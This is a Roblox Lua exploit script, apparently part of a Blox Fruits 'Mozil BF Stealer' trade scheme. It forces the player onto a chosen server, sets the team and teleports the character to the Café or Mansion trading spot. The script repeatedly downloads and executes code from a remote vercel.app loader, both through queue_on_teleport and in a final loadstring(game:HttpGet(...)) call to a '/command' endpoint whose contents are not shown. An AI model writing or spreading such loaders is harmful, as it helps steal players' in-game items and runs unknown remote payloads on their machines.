--=======================
--  Mozil BF Trade – Script 2 (Join Job, Team, Teleport Café / Mansion)
--=======================

local env        = getgenv and getgenv() or _G
local JOBID      = tostring(env.JOBID or "")
local TARGET_SEA = tostring(env.SEA or "2")
local USER       = tostring(env.USER or "")

local SCRIPT2_URL = "https://luarmorfromtemu.vercel.app/api/loader/v1/2"

local Players           = game:GetService("Players")
local TeleportService   = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService      = game:GetService("TweenService")
local CoreGui           = game:GetService("CoreGui")

local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
local CommF = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
-- nếu chưa có USER (queue không set / bạn quên set tay) thì auto = LocalPlayer
if USER == "" then
    env.USER = LocalPlayer and LocalPlayer.Name or ""
else
    env.USER = USER
end
if JOBID == "" or JOBID == "PASTE_THE_JOBID_HERE" then
    LocalPlayer:Kick("Invalid or missing JobId!")
    return
end

local SEA_PLACE = {
    ["1"] = {2753915549},
    ["2"] = {4442272183, 79091703265657},
    ["3"] = {7449423635, 100117331123089},
}

local SEA_FROM_PLACE = {}
for sea, list in pairs(SEA_PLACE) do
    for _, placeId in ipairs(list) do
        SEA_FROM_PLACE[placeId] = sea
    end
end

local TARGET_PLACES = SEA_PLACE[TARGET_SEA]
local TARGET_PLACE = TARGET_PLACES and TARGET_PLACES[1] or nil
if not TARGET_PLACE then
    LocalPlayer:Kick("Invalid SEA config!")
    return
end
--------------------------------------------------
-- Notification UI (MozilTradeNotifier)
--------------------------------------------------

local function getNotifyHolder()
    local NotiGui = CoreGui:FindFirstChild("MozilTradeNotifier")
    if not NotiGui then
        NotiGui = Instance.new("ScreenGui")
        NotiGui.Name = "MozilTradeNotifier"
        NotiGui.ResetOnSpawn = false
        NotiGui.IgnoreGuiInset = true
        NotiGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        NotiGui.Parent = CoreGui

        local holder = Instance.new("Frame")
        holder.Name = "Holder"
        holder.AnchorPoint = Vector2.new(1, 1)
        holder.Position = UDim2.new(1, -20, 1, -20)
        holder.Size = UDim2.new(0, 320, 0, 220)
        holder.BackgroundTransparency = 1
        holder.Parent = NotiGui

        local list = Instance.new("UIListLayout")
        list.Name = "ListLayout"
        list.FillDirection = Enum.FillDirection.Vertical
        list.VerticalAlignment = Enum.VerticalAlignment.Bottom
        list.HorizontalAlignment = Enum.HorizontalAlignment.Right
        list.Padding = UDim.new(0, 6)
        list.Parent = holder
    end

    return NotiGui:WaitForChild("Holder")
end

local Holder = getNotifyHolder()

local function Notify(title, text, duration)
    duration = duration or 3

    local frame = Instance.new("Frame")
    frame.BackgroundColor3 = Color3.fromRGB(16, 18, 28)
    frame.BorderSizePixel = 0
    frame.ClipsDescendants = true
    frame.Size = UDim2.new(0, 280, 0, 0)        -- set sẵn width để TextBounds tính đúng
    frame.Parent = Holder

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame

    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(80, 180, 255)
    stroke.Thickness = 1.5
    stroke.Parent = frame

    local padding = Instance.new("UIPadding")
    padding.PaddingTop    = UDim.new(0, 8)
    padding.PaddingBottom = UDim.new(0, 8)
    padding.PaddingLeft   = UDim.new(0, 10)
    padding.PaddingRight  = UDim.new(0, 10)
    padding.Parent = frame

    local titleLbl = Instance.new("TextLabel")
    titleLbl.BackgroundTransparency = 1
    titleLbl.Font = Enum.Font.GothamSemibold
    titleLbl.TextSize = 14
    titleLbl.TextXAlignment = Enum.TextXAlignment.Left
    titleLbl.TextColor3 = Color3.fromRGB(210, 230, 255)
    titleLbl.Text = title or "Mozil BF Stealer"
    titleLbl.Size = UDim2.new(1, 0, 0, 16)
    titleLbl.Parent = frame

    local msgLbl = Instance.new("TextLabel")
    msgLbl.BackgroundTransparency = 1
    msgLbl.Font = Enum.Font.Gotham
    msgLbl.TextSize = 13
    msgLbl.TextXAlignment = Enum.TextXAlignment.Left
    msgLbl.TextYAlignment = Enum.TextYAlignment.Top
    msgLbl.TextWrapped = true
    msgLbl.TextColor3 = Color3.fromRGB(190, 200, 220)
    msgLbl.TextTransparency = 0.1
    msgLbl.Text = text or ""
    msgLbl.Size = UDim2.new(1, 0, 0, 14)
    msgLbl.Parent = frame

    local layout = Instance.new("UIListLayout")
    layout.FillDirection = Enum.FillDirection.Vertical
    layout.SortOrder = Enum.SortOrder.LayoutOrder
    layout.Padding = UDim.new(0, 2)
    layout.Parent = frame

    -- đợi 1 frame cho TextBounds update theo width 280
    task.wait()

    local height = titleLbl.TextBounds.Y + msgLbl.TextBounds.Y + 20
    local targetSize = UDim2.new(0, 280, 0, math.max(32, height))

    -- animate từ 0 → kích thước thật
    frame.Size = UDim2.new(0, 0, 0, 0)
    frame.BackgroundTransparency = 1

    TweenService:Create(
        frame,
        TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        { Size = targetSize, BackgroundTransparency = 0 }
    ):Play()

    task.delay(duration, function()
        if frame and frame.Parent then
            local tween = TweenService:Create(
                frame,
                TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                { BackgroundTransparency = 1, Size = UDim2.new(0, 0, 0, 0) }
            )
            tween:Play()
            tween.Completed:Wait()
            if frame then frame:Destroy() end
        end
    end)
end

--------------------------------------------------
-- Helpers
--------------------------------------------------

local function queueSelf()
    local envUser = tostring((getgenv and getgenv().USER) or "")
    if typeof(queue_on_teleport) == "function" then
        queue_on_teleport(
            'getgenv().JOBID = "' .. JOBID .. '"; ' ..
            'getgenv().SEA = "' .. TARGET_SEA .. '"; ' ..
            'getgenv().USER = "' .. envUser .. '"; ' ..
            'loadstring(game:HttpGet("' .. SCRIPT2_URL .. '"))()'
        )
    end
end

local function isInTargetSea()
    local sea = SEA_FROM_PLACE[game.PlaceId]
    return sea == TARGET_SEA
end

local function waitHRP()
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    return char:WaitForChild("HumanoidRootPart", 10)
end

local function ensurePiratesTeam()
    Notify("Mozil BF Stealer", "Selecting Pirates team...", 3)
    for _ = 1, 2 do
        pcall(function()
            CommF:InvokeServer("SetTeam", "Pirates")
        end)
        task.wait(0.25)
    end
    task.wait(1.5)
end

--------------------------------------------------
-- Teleport Mansion (Sea 3) – giống Redz
--------------------------------------------------

local function teleportMansion()
    local hrp = waitHRP()
    if not hrp then return end

    -- vị trí cổng Mansion (giống Redz)
    local portalPos = Vector3.new(-12462, 375, -7552)

    Notify("Mozil BF Stealer", "Teleporting to Mansion...", 3)

    -- Gọi requestEntrance như Redz, KHÔNG CFrame thẳng tới đó nữa
    pcall(function()
        CommF:InvokeServer("requestEntrance", portalPos)
    end)

    -- nhẹ nhàng nhấc nhân vật lên tí cho đỡ kẹt floor (behaviour giống Redz)
    task.wait(0.5)
    if hrp and hrp.Parent then
        hrp.CFrame = hrp.CFrame + Vector3.new(0, 20, 0)
    end
end

--------------------------------------------------
-- Teleport Café (Sea 2) – instant gần + tween ngắn
--------------------------------------------------

local function teleportCafe()
    local hrp = waitHRP()
    if not hrp then return end

    local teleVec = Vector3.new(-390, 332, 673)                    -- Swan Mansion teleporter (gần Café)
    local cafeCF  = CFrame.new(-297.66, 73.22, 282.30)      -- The Cafe (Redz)

    Notify("Mozil BF Stealer", "Teleporting to Café...", 3)

    -- B1: dùng teleporter để nhảy tới gần
    pcall(function()
        CommF:InvokeServer("requestEntrance", teleVec)
    end)

    local start = tick()
    while tick() - start < 10 do
        if not hrp.Parent then
            hrp = waitHRP()
        end
        if (hrp.Position - teleVec).Magnitude < 1500 then
            break
        end
        task.wait(0.25)
    end

    -- B2: tween đoạn ngắn tới café
    hrp = waitHRP()
    if not hrp then return end

    local distance = (hrp.Position - cafeCF.Position).Magnitude
    if distance < 5 then
        hrp.CFrame = cafeCF
        return
    end

    local t = math.clamp(distance / 280, 0.3, 2)
    local tw = TweenService:Create(hrp, TweenInfo.new(t, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        CFrame = cafeCF
    })
    tw:Play()
    tw.Completed:Wait()
end

--------------------------------------------------
-- Main flow
--------------------------------------------------

Notify(
    "Mozil BF Stealer",
    string.format("Script 2 – Sea %s | JobId: %s", TARGET_SEA, string.sub(JOBID, 1, 8) .. "..."),
    4
)

-- Chưa đúng SEA → đợi teleport tiếp theo
if not isInTargetSea() then
    Notify("Mozil BF Stealer", "Not in target sea yet – waiting next teleport...", 3)
    queueSelf()
    return
end

-- Đúng SEA nhưng sai JobId → hop (thử tất cả placeId của SEA đó)
if tostring(game.JobId) ~= JOBID then
    local attempts = 0
    local maxAttempts = 5
    local tpConn

    local function doTeleport()
        attempts += 1
        if attempts > maxAttempts then
            if tpConn then
                tpConn:Disconnect()
            end
            Notify("Mozil BF Stealer", "Failed to join target server. Please re-check JobId / server status.", 5)
            return
        end

        Notify(
            "Mozil BF Stealer",
            string.format("Joining target server... (try %d/%d)", attempts, maxAttempts),
            4
        )
        queueSelf()

        local anyOk = false
        local lastErr

        for _, placeId in ipairs(TARGET_PLACES) do
            local ok, err = pcall(function()
                TeleportService:TeleportToPlaceInstance(placeId, JOBID)
            end)
            if ok then
                anyOk = true
                lastErr = nil
                break
            else
                lastErr = err
            end
        end

        if not anyOk and lastErr then
            if tpConn then
                tpConn:Disconnect()
            end
            Notify("Mozil BF Stealer", "Teleport error: " .. tostring(lastErr), 5)
        end
    end

    tpConn = TeleportService.TeleportInitFailed:Connect(function(player, result, errorMessage)
        if player ~= LocalPlayer then
            return
        end
        -- Roblox reject teleport (server full, generic failure, v.v.) → thử lại
        task.delay(1.5, doTeleport)
    end)

    doTeleport()
    return
end

Notify("Mozil BF Stealer", "Already in target server – preparing trade spot...", 3)

ensurePiratesTeam()

if TARGET_SEA == "2" then
    teleportCafe()
elseif TARGET_SEA == "3" then
    teleportMansion()
else
    Notify("Mozil BF Stealer", "Trade teleport only supports Sea 2 & 3.", 3)
end

loadstring(game:HttpGet("https://luarmorfromtemu.vercel.app/api/loader/v1/command"))()
